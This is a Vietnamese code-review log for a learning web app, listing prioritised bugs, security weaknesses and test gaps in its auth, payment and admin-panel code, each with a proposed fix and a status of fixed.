| AU-002 | `StatelessAuthController.cs` + `StatelessAuthStrategy.cs` (toàn bộ) | **Zero test** cho hệ auth frontend THỰC SỰ đang gọi (`/api/v1/concepts/auth/*`); test hiện chỉ phủ classic AuthService mà frontend không dùng | Thêm `StatelessAuthControllerTests`/`StatelessAuthStrategyTests` (InMemory DbContext — đã có `TestDbContextFactory.cs`) |
| AU-003 | `authP0Tests.spec.ts:47-63,117-133` + `AuthServiceTests.cs` | Luồng **Register** không được test cả 2 đầu: mock register khai báo nhưng không test nào gọi; backend thiếu trùng email/username → 400 | Test register thành công + trùng email + password policy ở cả store và backend |

### 🟠 P1

| ID | Vị trí | Mô tả | Đề xuất |
| :--- | :--- | :--- | :--- |
| AU-004 | `AuthService.cs:110-136` + `StatelessAuthStrategy.cs:173-195` | **Refresh rotation race:** 2 refresh song song cùng 1 token đều pass (revoke chưa commit) → sinh 2 phiên hợp lệ; không reuse detection/family revocation; stateless `TryGetValue`+`TryRemove` không nguyên tử | Revoke+commit trong 1 transaction trước khi generate; stateless chỉ generate khi `TryRemove` trả true |
| AU-005 | `main.ts:87` + `App.vue:126` + `useAuthStore.ts:250` | `statelessInit()` gọi LẦN 2 ở onMounted (không qua `refreshPromise` dedupe) → 2 refresh song song cùng token; backend rotate → request 2 nhận 401 → catch xóa keys → **user bị logout ngay sau khởi động** | Bỏ call App.vue hoặc đưa qua `refreshAccessToken()` chung |
| AU-006 | `useAuthStore.ts:119-123,238-248` + `App.vue:105-112` + `useUserProgressStore.ts:77,159` | **Logout không reset store phụ thuộc:** XP `pendingSyncQueue` (localStorage, không xóa) → XP user A bị flush sang user B khi đăng nhập sau; quiz/progress/notifications giữ data cũ | Reset toàn bộ store + xóa sync queue khi logout; gắn `userId` vào payload queue |
| AU-007 | `main.ts:57-74` + `useAuthStore.ts:155-176` + `router/index.ts:51-53` | **Session expiry âm thầm:** refresh fail chỉ `console.error`, không toast "Phiên đã hết hạn", không redirect → UI header đã về "Đăng nhập" nhưng data user cũ (XP/history) vẫn hiện | Toast warning + redirect landing (kèm route nguồn) + clear stores |
| AU-008 | `useAuthStore.ts:102` | `init()` catch-all `clearSession()` cả khi lỗi mạng/5xx (mâu thuẫn rule "chỉ xóa khi 4xx" của refreshAccessToken:157) → backend down lúc khởi động là mất session oan | Tái dùng `isAuthFailure` logic như refreshAccessToken |
| AU-009 | `appsettings.json:13` + `JwtSigningConfig.cs:13` + `Program.cs:182` | **JWT key placeholder commit trong repo** + fallback hardcode trong source; fail-fast chỉ chặn Production → staging/demo thiếu env `Jwt:Key` là ai cũng ký được token | Ép env ở mọi môi trường (dev: sinh key ngẫu nhiên + log warning), xóa fallback |
| AU-010 | `router/index.ts:36-70` | Guard `requiresAuth`/`requiresRole`/redirect landing/`stopImpersonating` khi rời /admin — **0 test** | Spec guard với router thật + store set role Admin/Teacher/Student |

### 🟡 P2

| ID | Vị trí | Mô tả | Đề xuất |
| :--- | :--- | :--- | :--- |
| AU-011 | `AuthService.cs:110-136` | Standard refresh KHÔNG check `user.IsActive` — user bị ban vẫn refresh vô hạn (stateless đã có ban check) | Check IsActive trong `RefreshTokenAsync` |
| AU-012 | `AuthService.cs:31-64` | Register check-then-insert TOCTOU → `DbUpdateException` → 500 thay vì 400/409 | Catch unique violation → 409/400 |
| AU-013 | `StatelessAuthController.cs:81-83,137-140` | User enumeration: email ở DB → message generic; email in-memory → trả thẳng `ex.Message` chi tiết | 1 message generic cho cả 2 nhánh |
| AU-014 | `AuthService.cs:68-75` + `StatelessAuthStrategy.cs:146-150` | Login timing side-channel: email không tồn tại → 0ms; tồn tại → BCrypt ~200-300ms | Verify dummy hash cùng cost khi không tìm thấy |
| AU-015 | `StatelessAuthController.cs:485-560` | change-password KHÔNG rate limit (chỉ register/login/refresh/logout có) → brute-force CurrentPassword | Thêm `[EnableRateLimiting("auth")]` |
| AU-016 | `StatelessAuthStrategy.cs:18-20,346-377` | Singleton ConcurrentDictionary **không bao giờ evict** → memory leak; `EnsureUserInMemory` không refresh dữ liệu → XP/level/premium đổi qua flow DB không bao giờ cập nhật (stale vĩnh viễn) | TTL eviction + cập nhật lại khi user tồn tại |
| AU-017 | `StatelessAuthStrategy.cs:192-193` | Bug TTL: token còn < 1s rơi nhánh `else` → gia hạn FULL 30 ngày (ternary `remaining>1s && <30d ? remaining : 30d` sai) | `Math.Clamp(remaining, 1s, 30d)` hoặc từ chối token < 1s |
| AU-018 | `LoginModal.vue:25-35` | Register THIẾU ô "Xác nhận mật khẩu" — gõ sai 1 ký tự vẫn đăng ký thành công, logout xong không vào lại được | Thêm field confirm + so khớp client-side |
| AU-019 | `LoginModal.vue:2-58` | Thiếu focus trap/autofocus/restore focus — Tab lọt ra ngoài modal, đóng không trả focus | Autofocus email + trap Tab + restore `document.activeElement` |
| AU-020 | `App.vue:105-112` | Logout không confirm — mất phiên/quiz đang làm ngay | Confirm dialog hoặc toast Undo |
| AU-021 | `ProfileSecurityTab.vue:76` | `catch (err: any)` vi phạm no-any + lỗi raw "HTTP 401: Unauthorized" tiếng Anh; `err.message` có thể undefined | `catch (err: unknown)` + hàm chuẩn hóa lỗi, map 401 → thông báo hết hạn |
| AU-022 | `StatelessAuthController.cs:517-533` | Đổi mật khẩu không revoke refresh token/session khác đang sống — thiết bị cũ giữ phiên bằng mật khẩu cũ; UI không nhắc đăng xuất thiết bị khác | Backend gọi `RevokeAllRefreshTokens`; UI thông báo |
| AU-023 | `App.vue:118-122` | Dùng `alert()` native khi thoát impersonate — phá design system Glassmorphic | Thay `toastStore.success` |
| AU-024 | `ProfileSecurityTab.vue:64-81` | Lỗi "mật khẩu hiện tại sai" chỉ toast 6s, không gắn field/focus | Inline error theo field + focus |
| AU-025 | `authP0Tests.spec.ts` + `useAuthStore.spec.ts` | Nhánh `_scheduleRefresh` chưa test vì KHÔNG fake timers; mỗi test login (expiresIn 3600) còn rò 1 timer thật 3.480.000ms; nhánh refresh-fail→clear-session chưa test | `vi.useFakeTimers()` + `advanceTimersByTime` + `afterEach` clear |
| AU-026 | `AuthServiceTests.cs:86-87,115-116` | Setup `FindAsync(Any)` khớp mọi predicate → không phân biệt trùng email vs username; thiếu: ban login, email không tồn tại, refresh expired/revoked, logout revoke | Predicate theo từng case + bổ sung 5 case |
| AU-027 | `authP0Tests.spec.ts:229-249` + `AuthService.cs:138-150` | Logout chỉ assert state local, không assert `authApi.logout(token...)` được gọi (server revoke); `LogoutAsync` backend chưa test; edge: logout khi access token đã hết hạn → refresh token 30 ngày không bị revoke | Assert `toHaveBeenCalledWith` + test revoke server-side |
| AU-028 | `useAuthStore.ts:319-332` | `startImpersonating` (gọi API `/admin/users/{id}/impersonate` + Bearer admin token) chưa test — chỉ test `impersonate()` manip state | Test với fetch stub assert header Authorization |
| AU-029 | `authP0Tests.spec.ts:253-267` | Assertion vô nghĩa `userLevel >= 1`, `userXP >= 0` (luôn đúng mọi object) | Assert giá trị cụ thể khớp mock |

### 🟢 P3 (tổng hợp)

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| AU-030 | `AuthService.cs:123-125` + `StatelessAuthController.cs:251-254` | Refresh token của user đã xóa → 404 "Người dùng không tồn tại" thay vì 401 (leak thông tin) |
| AU-031 | `Application/DTOs/UserDto.cs:75-76` | `Token => AccessToken` [Obsolete] không [JsonIgnore] → payload serialize thêm field "token" trùng |
| AU-032 | `StatelessAuthDto.cs:62,81,90,97` | 4 field `UserId` dead code (controller lấy id từ token) — mời gọi IDOR |
| AU-033 | `AuthService.cs:208-224` + `StatelessAuthStrategy.cs:24-34` + `StatelessAuthController.cs:34-50` | Logic verify hash (BCrypt→fallback SHA256) duplicate 3 chỗ, dễ lệch |
| AU-034 | `StatelessAuthController.cs:60-64` | Tên method `HashPasswordSHA256` sai — thực tế BCrypt (workFactor 12) |
| AU-035 | `StatelessAuthStrategy.cs:303-323` + `JwtHelper.cs:28-63` | Token stateless thiếu claim iss/aud; JwtHelper không validate — lệch chuẩn JwtBearer |
| AU-036 | `Program.cs:320-327` | Rate limit unauthenticated partition theo IP → NAT trường học 429 hàng loạt |
| AU-037 | `AuthService.cs:35,68` + `StatelessAuthController.cs:81` | Email không normalize (Trim/ToLowerInvariant) — "User@x.com" ≠ "user@x.com" |
| AU-038 | `AuthService.cs:120-127` | Revoke token cũ TRƯỚC generate → DB fail = mất session vĩnh viễn |
| AU-039 | `StatelessAuthController.cs:174-177,235-239` | Catch rộng "DB lỗi → bỏ qua ban check" → fail-open: DB down thì user bị BAN vẫn login/refresh |
| AU-040 | `useAuthStore.ts:164-171,238-248,356-410` | `statelessLogout` không clear refreshTimer + 4 key ADMIN_*; `stopImpersonating` không `_scheduleRefresh` sau restore |
| AU-041 | `main.ts:91-99` | Promise.race timeout 5s: init resolve sau → không re-navigate lại route đã định (user kẹt landing) |
| AU-042 | `main.ts:27,57-71` | `isRefreshRequest` khai báo không dùng; 401 không có refresh token → console.error noise từng request public |
| AU-043 | `LoginModal.vue:91` | Gán `authError` trực tiếp (vi phạm Pinia discipline) — cần action `clearError()` |
| AU-044 | `apiClient.ts:47-54` + `main.ts:39-44` | Authorization header gắn 2 lớp (apiClient + global fetch wrapper) |
| AU-045 | `authApi.ts` + `apiClient.ts:21-31` + `statelessAuthApi.ts:83,134,148` | Dead code: classic login/register/logOut/getMe, `getStoredRefreshToken/setStoredTokens/clearStoredTokens`, fallback `localStorage.getItem('token')`, `getProgress`/`getDemoCredentials` |
| AU-046 | `LoginModal.vue:70-73,94-105` | Form không reset khi đóng/sau thành công (password cũ nằm trong memory component) |
| AU-047 | `LoginModal.vue:13-15,79-85` | `authError` không clear khi mở lại modal — lỗi cũ vẫn hiện |
| AU-048 | `LoginModal.vue:33` + `ProfileSecurityTab.vue:15,25,35` | Thiếu `autocomplete="current-password"/"new-password"` |
| AU-049 | `LoginModal.vue:51-54` | Demo credentials hardcode + hiển thị cả register mode (có sẵn `getDemoCredentials()` nhưng không dùng) |
| AU-050 | `useAuthStore.ts:283-311` + `LoginModal.vue:37` | `isLoading` global dùng chung nhiều action — updateProfile/changePassword đang chạy làm disabled nhầm nút login |
| AU-051 | `LoginModal.vue:4` | Click backdrop đóng modal mất dữ liệu đang nhập |
| AU-052 | `AppHeader.vue:77` | Avatar `userName.charAt(0).toUpperCase()` — username có thể bắt đầu bằng số/ký tự đặc biệt → avatar ký tự lạ |
| AU-053 | `useAuthStore.spec.ts:6-27` + `authP0Tests.spec.ts:5-26` | Duplicate 100% class `LocalStorageMock` + module-scope side-effect; `getItem` trả null cho chuỗi rỗng |
| AU-054 | 2 file test auth | Impersonation test trùng ở cả 2 file — phân vai: 1 spec store, 1 spec API, 1 spec guard |
| AU-055 | `statelessAuthApi.ts:112-118` + `StatelessAuthController.cs:217-243` | Frontend gửi `userId` trong body refresh nhưng backend không đọc — contract field chết |

---

## 🔬 REVIEW ROUND 8 — 2026-08-11: Payment/Checkout Premium (4 sub-agent, 65 lỗi ghi nhận)

**Scope:** `frontend/src/features/payment/**` (usePaymentStore, statelessPaymentApi, QrPaymentPanel, PremiumGate, CheckoutSuccessScreen, CheckoutIdleScreen, usePaymentTimer, usePaymentPolling) + `views/checkout/PremiumCheckoutView.vue` · backend `PaymentsController.cs`/`StatelessPaymentController.cs`/`PaymentService.cs`/`StatelessPaymentStrategy.cs` · tests 2 đầu.
**Phương pháp:** 4 góc nhìn — đã khử trùng lặp, ID PM-001→065 (P0=5, P1=15, P2=24, P3=21). **✅ ĐÃ FIX 2026-08-11** (4 sub-agent fix song song: Backend / Store-State / UI-UX / Tests). Kết quả: backend **472/472 PASS** (+56), frontend **2846/2846 PASS** (157 files, +20), `vue-tsc` 0 lỗi. Chi tiết fix: `plan/tracking/errors.md` Review Round 8. Còn lại: PM-053 DEFERRED (countdown timestamp).

### 🔴 P0

| ID | Vị trí | Mô tả | Đề xuất |
| :--- | :--- | :--- | :--- |
| PM-001 | `StatelessPaymentController.cs:61-85` + `StatelessPaymentStrategy.cs:100-121` | **Cấp Premium MIỄN PHÍ:** `POST /api/v1/concepts/payment/verify` không có dev-guard (chỉ simulate-webhook có) — user đăng nhập gọi với orderId của mình → order `Completed` + `PersistPremiumStatus` ghi premium vào DB thật | Chặn endpoint ngoài Development hoặc chỉ trả trạng thái order; mọi cấp premium đi qua webhook xác thực |
| PM-016 | `usePaymentStore.ts:64-74` + `PremiumCheckoutView.vue:42-49` | **Stateless dead-end:** startCheckout (stateless) KHÔNG gọi startPolling, verifyPayment không được component nào gọi → user kẹt mãi 'paying', không bao giờ tới success (trừ nút simulate DEV) | Gọi startPolling cho cả 2 branch hoặc thêm nút verify trong QrPaymentPanel |
| PM-049 | `checkoutP2Tests.spec.ts:423-436` | Test "Escape key closes" bắn KeyboardEvent rồi **không assertion** — pass vô điều kiện | Thêm `expect(modal closed)` sau dispatch |
| PM-050 | `exportP2Tests.spec.ts:1296-1310` | Test usePaymentPolling "handle error gracefully" không có expect nào, không mock reject | Mock reject + assert onError + polling dừng |
| PM-051 | `paymentP0Tests.spec.ts:221-228` | Test PA-014 tựa đề "startPolling after checkout" nhưng mock `isStatelessMode: true` và chỉ assert checkoutState — tựa đề sai, assertion không liên quan | Viết test thật nhánh non-stateless + fake timers assert getOrderStatus gọi |

### 🟠 P1

| ID | Vị trí | Mô tả | Đề xuất |
| :--- | :--- | :--- | :--- |
| PM-002 | `StatelessPaymentController.cs:114-133` + `StatelessPaymentStrategy.cs:134-151` | simulate-webhook thiếu ownership check (user A hoàn thành order user B); bảo vệ duy nhất là env IsDevelopment — production set Development = tự cấp premium | Truyền userId từ token so sánh order.UserId; guard env + khóa dev riêng |
| PM-003 | `Order.cs:40-46` + `PaymentService.cs:135` | Order KHÔNG có vòng đời hết hạn: QR/timer 15 phút chỉ ở frontend; backend không Expired, `Cancel()` dead — QR cũ 1 tháng vẫn cấp premium | Thêm `ExpiresAt` + background job hoặc webhook chặn quá hạn |
| PM-004 | `PaymentService.cs:94-98` vs 159-180 | TOCTOU webhook idempotency: check TransactionReference NGOÀI transaction → 2 webhook song song cùng id đều pass | Check trong transaction + unique index + compare-and-swap |
| PM-005 | `PaymentService.cs:143-149` | Webhook fail-open khi thiếu config `SePay:BankAccount` (CreateOrderAsync fallback "99999999999") → mọi giao dịch hợp lệ | Fail-closed khi thiếu config |
| PM-006 | `StatelessPaymentStrategy.cs:21-24,81-82` vs `PaymentService.cs:32-40` | 2 luồng song song phân kỳ: giá hardcode 199.000/bank trong stateless vs config SePay trong PaymentService; logic tạo order/QR nhân đôi | 1 nguồn config giá/bank duy nhất |
| PM-007 | `StatelessPaymentController.cs:170-182` | Premium state split-brain (memory vs DB), ghi không atomic với transaction order — DB fail = lệch trạng thái | Cấp premium trong 1 transaction; 1 nguồn chân lý DB |
| PM-008 | `PaymentService.cs:24-69` | CreateOrderAsync không chặn user đã premium/chồng pending order (stateless có chặn — không nhất quán) | Chặn premium + pending chưa hết hạn |
| PM-017 | `usePaymentStore.ts:161-191` | Double-submit: nút "Thử lại" QR không disable khi isLoading; store không reentrancy guard → nhiều order, order cũ không hủy | Guard `if (isLoading) return` + truyền isLoading disable |
| PM-018 | `usePaymentStore.ts:175-176` | Polling leak khi logout/token null: `if (!token) return` không stopPolling → interval chạy tiếp 5 phút; user mới poll nhầm order cũ | `if (!token) { stopPolling(); return; }` |
| PM-019 | `usePaymentStore.ts:163-167` + `usePaymentTimer.ts` | Mâu thuẫn 2 bộ đếm: QR 15 phút (900s) vs polling timeout 5 phút → user chuyển tiền phút 6-15 thấy lỗi giả | Đồng bộ POLLING_TIMEOUT với thời hạn QR |
| PM-020 | `PremiumGate.vue:35-41` | **PremiumGate là dead UI**: không mount ở đâu (chỉ test); gating premium chưa tồn tại trong sản phẩm | Mount vào trang premium hoặc xóa |
| PM-052 | `exportP2Tests.spec.ts:1265-1281` | Test polling advance 3000ms nhưng mock trả 'pending' → onSuccess không bao giờ chạy, test pass giả | Mock 'Completed' + assert onSuccess |
| PM-053 | `PaymentServiceTests.cs:37-65` | Backend chỉ 1 test idempotency; thiếu guard webhook: sai TransferType/underpay/sai code/order Completed → false | Theory từng guard của ProcessSePayWebhookAsync |
| PM-054 | `PaymentServiceTests.cs:159-180` | Không test success path atomic (Begin/Commit + SetPremiumStatus), rollback, 2 webhook cùng id không double-grant | Test 3 kịch bản trên |
| PM-055 | `usePaymentStore.ts:163-168` | Timer hết giờ → state 'error' chưa có test; usePaymentTimer hết giờ chỉ che QR không sync store | Fake timers + advance 5 phút assert error |
| PM-056 | `statelessPaymentApi.ts:99-158` + `paymentApi.ts:31-51` | Không test 401 → refresh; cả 2 API không retry khi token hết hạn | Test 401 → refreshAccessToken → retry |
| PM-057 | `PaymentsController.cs:86-106` | Không controller test webhook auth (sai/thiếu ApiKey → 401); simulate-webhook ngoài Dev → 404 chưa test | xUnit controller tests 2 kịch bản |

### 🟡 P2

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| PM-009 | `Order.cs:12` + `PaymentService.cs:135` | Magic string "Pending/Completed/Cancelled" thay vì enum OrderStatus (đã tồn tại, dead code) |
| PM-010 | `StatelessPaymentStrategy.cs:15-18` | `_orders`/`_transactionLog` in-memory không evict → RAM tăng vô hạn |
| PM-011 | `PaymentsController.cs:127-131` | `Guid.Parse(claim!)` NRE → 500 khi token thiếu sub (JwtHelper không yêu cầu sub) |
| PM-012 | `PaymentsController.cs:80-125` | Webhook `[AllowAnonymous]` không rate-limit; dòng 89 trả message lộ cấu hình nội bộ |
| PM-013 | `PaymentsController.cs:117` | Webhook không khớp trả 200 → tiền mồ côi không log/admin không biết, không refund flow |
| PM-014 | `PaymentDto.cs:6-9` + `StatelessPaymentDto.cs:31-35` | `CreateOrderRequest` rỗng; `StatelessVerifyRequest.UserId` nhận từ client nhưng bị bỏ qua (hiểu nhầm bảo mật) |
| PM-015 | `StatelessPaymentStrategy.cs:186-187` | CheckFeatureAccess fail-open: feature không tồn tại → true (mở) |
| PM-021 | `usePaymentStore.ts:118,144-146,184-186,219-221` | Mutation trực tiếp `authStore.currentUser.isPremium = true` (4 chỗ) vi phạm Pinia; statelessUser không cập nhật → profile stale |
| PM-022 | `usePaymentStore.ts:21-23,30-31` | Stale state đổi user: premiumStatus/currentOrder singleton không reset khi logout/login |
| PM-023 | `statelessPaymentApi.ts:100-158` | Không timeout/AbortController → startCheckout treo vô hạn; polling 5s không guard in-flight |
| PM-024 | `usePaymentPolling.ts:1-45` | Dead code: chỉ import trong test; trùng logic startPolling store nhưng lệch contract (3s vs 5s, không 'Completed') |
| PM-025 | `usePaymentStore.ts:180,141,188-190` | Polling nuốt lỗi im lặng (catch {} không log) — token chết user chờ 5 phút |
| PM-026 | `PremiumCheckoutView.vue:32-39` + `usePaymentStore.ts:55` | User đã premium vẫn vào mua tiếp (không guard isPremium ở view lẫn store) |
| PM-027 | `PremiumCheckoutView.vue:62` + store | Lỗi hiển thị raw `err.message` ("HTTP 500...") không map tiếng Việt |
| PM-028 | `QrPaymentPanel.vue:24-61` | QR expired vẫn hiển thị số tài khoản + nút Copy + box "tự kiểm tra" → user chuyển tiền nhầm |
| PM-029 | `PremiumCheckoutView.vue:128-131` | Sau success cứng đẩy /sorting — không quay lại route nguồn (gate ở lesson/sandbox nào) |
| PM-030 | `PremiumGate.vue:15-17,110-114` | A11y: content aria-hidden nhưng vẫn trong tab order; không role=dialog/focus quản lý |
| PM-031 | `PremiumMarketingCard.vue:47-49` vs `QrPaymentPanel.vue:106-108` | Format tiền không nhất quán: "199.000đ" (dán) vs Intl "199.000 ₫" |
| PM-032 | `PremiumMarketingCard.vue:34-35` + store:39 | Giá lệch 2 panel: card lấy config fallback 199.000 (catch im lặng), QR lấy order.amount; giá gạch ngang 499.000 hardcode |
| PM-033 | `paymentP0Tests.spec.ts:44` | Mock getConfig trả premiumFeatures: [] lệch contract backend (6 feature); premiumPrice default 199000 không chứng minh mapping |
| PM-034 | `exportP2Tests.spec.ts:871-1128` | Order object partial thiếu id/userId/status/createdAt — component đổi field không test nào bắt |
| PM-035 | `paymentApi.spec.ts:9-65` | Chỉ 2 test; **0 test cho statelessPaymentApi** (8 endpoint — contract chính chưa khóa) |
| PM-036 | `exportP2Tests.spec.ts:1197-1261` | PremiumGate dùng useRouter thật nhưng mount không inject → goToCheckout crash undefined.push |
| PM-037 | `paymentP0Tests.spec.ts:109-119` | Auth mock object phẳng không reactive → isPremium không trigger; không test premium false→true sau success |
| PM-038 | `exportP2Tests.spec.ts:134` | Mock getOrderStatus trả 'paid' — giá trị KHÔNG tồn tại backend (chỉ Pending/Completed) |

### 🟢 P3 (tổng hợp)

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| PM-039 | `usePaymentStore.ts:180,141` | Nhánh `status === 'paid'` chết (backend chỉ trả Pending/Completed) |
| PM-040 | `PremiumCheckoutView.vue:113-118` + store:158 | Timer không stop khi success → countdown chạy tiếp, isExpired có thể phủ overlay success |
| PM-041 | `statelessPaymentApi.ts:84` | `getAuthToken()` fallback localStorage 'token' (key không tồn tại); Authorization gắn 2 nơi |
| PM-042 | `usePaymentStore.ts:55-98` | startCheckout không reset currentOrder cũ → retry fail state 'error' nhưng order cũ stale |
| PM-043 | `usePaymentStore.ts:237-245` + `PremiumGate.vue:39-40` | checkFeatureAccess + freeFeatures hardcode dead (chỉ test dùng) |
| PM-044 | `QrPaymentPanel.vue:6` | alt QR tiếng Anh "VietQR Pay Code"; không fallback khi qrUrl rỗng |
| PM-045 | `QrPaymentPanel.vue:91-104` | Copy fail âm thầm, không fallback execCommand khi clipboard không sẵn |
| PM-046 | `QrPaymentPanel.vue:49` | aria-live đặt trên chính nút Copy; countdown không announce |
| PM-047 | `QrPaymentPanel.vue:42` | formatCurrency(order?.amount ?? 0) → "0 ₫" gây hiểu lầm khi order null |
| PM-048 | `PremiumCheckoutView.vue:52-55` | Branch 'verifying' dead UI (verifyPayment không bao giờ gọi) |
| PM-049 | `PremiumCheckoutView.vue:63` | State error cần 2 click retry (chỉ resetCheckout, phải bấm thêm "Bắt đầu") |
| PM-050 | `PremiumCheckoutView.vue:42-58` | Không quản lý focus khi chuyển state idle→QR→success |
| PM-051 | `CheckoutSuccessScreen.vue:3` | animate-bounce lặp vô hạn không tôn trọng prefers-reduced-motion |
| PM-052 | `QrPaymentPanel.vue:16,46,58` + MarketingCard:37 | Nhiều chữ 10px quá nhỏ cho số tài khoản/hướng dẫn |
| PM-053 | `usePaymentTimer.ts:20-26` | setInterval(1000) bị throttling tab nền → countdown lệch thực tế |
| PM-054 | `exportP2Tests.spec.ts:826-832` | Biến `let store` dead code |
| PM-055 | `exportP2Tests.spec.ts:1141-1338` | Fake timers không try/finally — rò timer khi assertion fail |
| PM-056 | `PaymentServiceTests.cs` (chung) | Magic string + test success path không assert premium flag đúng |
| PM-057 | `exportP2Tests.spec.ts` | View tests mock 100% store+API → chỉ smoke template |

---

## 🔬 REVIEW ROUND 9 — 2026-08-11: Admin Panel (4 sub-agent, 60 lỗi ghi nhận)

**Scope:** `frontend/src/views/admin/**` (AdminPanelView, AdminUsersTab, AdminQuizzesTab, AdminDashboardTab, AdminAuditTab, AdminSystemTab, useAdminApi) + `useAuthStore` impersonate · backend `AdminController.cs`/`UsersController.cs` + audit chain (AuditEventService, AuditEventActionFilter, ImmutableAuditInterceptor) · tests 2 đầu.
**Phương pháp:** 4 góc nhìn — đã khử trùng lặp, ID AD-001→060 (P0=1, P1=5, P2=33, P3=21). **✅ ĐÃ FIX 2026-08-11** (4 sub-agent: Backend / Frontend Core / Frontend UI / Tests — core chạy lại lần 2). Kết quả: backend **507/507 PASS** (+35), frontend **2866/2866 PASS** (158 files, +20), `vue-tsc` 0 lỗi. Chi tiết fix: `plan/tracking/errors.md` Review Round 9. Còn lại: AD-024/AD-044 PARTIAL (giữ native confirm + impersonate fetch tại component do test pin hành vi).

### 🔴 P0

| ID | Vị trí | Mô tả | Đề xuất |
| :--- | :--- | :--- | :--- |
| AD-001 | `AdminController.cs:643-664` + `JwtHelper.cs:60-69` | **Impersonate vỡ hoàn toàn:** `GenerateImpersonatedJwt` thiếu claim `iss`/`aud` nhưng `JwtHelper.RequireToken` fail-closed đòi 2 claim này → mọi request token impersonate bị 401; không test nào bắt (mock trả token "hợp lệ") | Thêm iss/aud vào payload token impersonate + test round-trip impersonate→API→200 |

### 🟠 P1

| ID | Vị trí | Mô tả | Đề xuất |
| :--- | :--- | :--- | :--- |
| AD-002 | `AdminController.cs:547-641` | Impersonate không chặn target Admin/Teacher: admin A impersonate admin B → quyền admin dưới danh tính B, audit gán nhầm ActorId; claims `isImpersonated`/`originalAdminId` sinh ra nhưng không được validate (dead) | Chỉ impersonate Student; validate originalAdminId ở hành động nhạy cảm |
| AD-003 | `AdminController.cs:174-208` + `RequireJwtRoleAttribute.cs:74-89` | Role check từ CLAIM token không đối chiếu DB (chỉ IsActive check DB): admin bị demote vẫn giữ quyền 15 phút + tự `PUT /users/{self}/role` hồi phục vĩnh viễn | RequireJwtRole đối chiếu role từ DB hoặc token-version |
| AD-004 | `AdminController.cs:518-541` | **BanUser KHÔNG ghi audit** — hành động nhạy cảm nhất không có LogAdminAction (6 hành động khác đều có) | Thêm LogAdminAction("BanUser"/"UnbanUser") |
| AD-005 | `AdminController.cs:322-324` | `ExecuteDeleteAsync()` (UserLessonProgresses) không await (fire-and-forget) + DeleteUser không dọn FK `TheoryArticle.AuthorId`/`ClassroomAnnouncement.AuthorId`/`Course.TeacherId` (Restrict) → FK violation 500 | Await + dọn FK hoặc Conflict rõ ràng |
| AD-006 | `AdminController.cs:119-160` | GetDashboard catch MỌI exception → trả dữ liệu giả `new Random()` + "(Simulated)" — admin nhìn sai số liệu kinh doanh, che giấu outage | Fallback chỉ khi DB down xác nhận + flag `isFallback: true` |

### 🟡 P2

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| AD-007 | `AuditEventActionFilter.cs:39-41` | HttpContext.User luôn rỗng (hệ dùng RequireJwtRole) → UserId mọi audit frame = null, mất danh tính actor |
| AD-008 | `AuditEventService.cs:23-36` + `Program.cs:65` | Audit filter dùng CHUNG DbContext scoped với action → Save audit có thể commit thay đổi dang dở của action |
| AD-009 | `AdminController.cs:366-394` | ResetPassword không rate limit (endpoint nhạy cảm) |
| AD-010 | `AdminController.cs:402-403,452-453,484-485` | `[RequireJwtRole("Teacher,Admin")]` dead config — class-level "Admin" chạy trước → Teacher luôn 403, sai contract |
| AD-011 | `ImmutableAuditInterceptor.cs:37` | Chỉ bảo vệ SystemAuditEventStream; bảng `AuditLog` (admin audit) mutable hoàn toàn |
| AD-012 | `UsersController.cs:83-97` | SyncXP tự cộng XP Amount tùy ý không cap → user tự phá level/thứ hạng |
| AD-013 | `AdminController.cs:626-640` ↔ `useAuthStore.ts:209-234` | Impersonate response `user.level` nhưng store đọc `currentLevel`, thiếu totalXP/streakDays/badges → currentUser toàn undefined (profile NaN XP) |
| AD-014 | `useAuthStore.ts:383-447` | stopImpersonating gán accessToken admin cũ — impersonate > 15 phút → token hết hạn, remainingSeconds<=0 không schedule refresh → /admin 401 im lặng |
| AD-015 | `AdminUsersTab.vue:167-168,31,36` | isLastAdmin tính adminCount chỉ trên trang hiện tại (pageSize 10) → chặn thao tác sai + nhãn "⚠ Cuối cùng" sai |
| AD-016 | `AdminUsersTab.vue:174` | loadUsers `if (!res.ok) return` im lặng → hiển thị "Không tìm thấy người dùng" khi thật ra lỗi; totalPages giữ cũ |
| AD-017 | `AdminUsersTab.vue:7,182` | onSearch gọi API mỗi phím gõ — flood + race out-of-order (response cũ ghi đè) |
| AD-018 | `AdminUsersTab.vue:200-217,228-235` | togglePremium/Ban/delete/changeRole không in-flight guard; premium không confirm → misclick + 2 request |
| AD-019 | `useAdminApi.ts:22-27` (mọi tab) | Fetch admin không timeout/AbortController — request treo vô hạn, spinner kẹt; không xử lý 401→refresh |
| AD-020 | `useAuthStore.ts:343-356,383-447` | impersonate/stopImpersonating không gọi _resetDependentStores → user-progress stale XP/level chéo store |
| AD-021 | `useAdminApi.ts:13-17` + `AdminDashboardTab.vue:106-115` + `AdminSystemTab.vue:38-46` | Dashboard "Nhật ký hệ thống" + AdminSystemTab toàn data FAKE local (seed + hardcode ping 25ms/DB 4.2%) hiển thị như thật |
| AD-022 | `AdminUsersTab.vue:54` | Nút Xóa vĩnh viễn dùng chung class `ban-btn--banned` (đỏ) giống nút Khóa + icon close (✕) → nguy cơ xóa nhầm |
| AD-023 | `AdminUsersTab.vue:31,48,54` + `AdminController.cs:518-541` | Admin cuối không được bảo vệ khi Ban/Xóa (backend DeleteUser không LAST_ADMIN_PROTECTED) — tự khóa mình |
| AD-024 | `AdminUsersTab.vue:188,211,220,229...` + `App.vue:120` | Toàn panel dùng confirm()/alert() native — không destructive red, không focus trap, không nhất quán Toast/Dialog |
| AD-025 | `AdminQuizzesTab.vue:47,94-95` | Empty state quiz = "Đang tải danh sách Quiz..." hiển thị vĩnh viễn khi lỗi/rỗng; load chi tiết lỗi im lặng |
| AD-026 | `AdminAuditTab.vue:63` | pageSize=100 cố định, không pagination UI — log cũ hơn 100 dòng không xem được |
| AD-027 | `AdminPanelView.vue:15-26` | Tabs không role=tablist/aria-selected/phím điều hướng |
| AD-028 | `AdminUsersTab.vue:73,84,105,109,127,131` | 3 modal thiếu role=dialog/aria-modal/focus trap/Escape + nút × không aria-label |
| AD-029 | `AdminDashboardTab.vue:49-53` | Chart height `Math.min(5, count)` chặn cứng — 5 hay 500 lượt vẽ bằng nhau |
| AD-030 | `AdminDashboardTab.vue:95-101` | Top 5 học viên không empty state; stats 0 không phân biệt loading/rỗng |
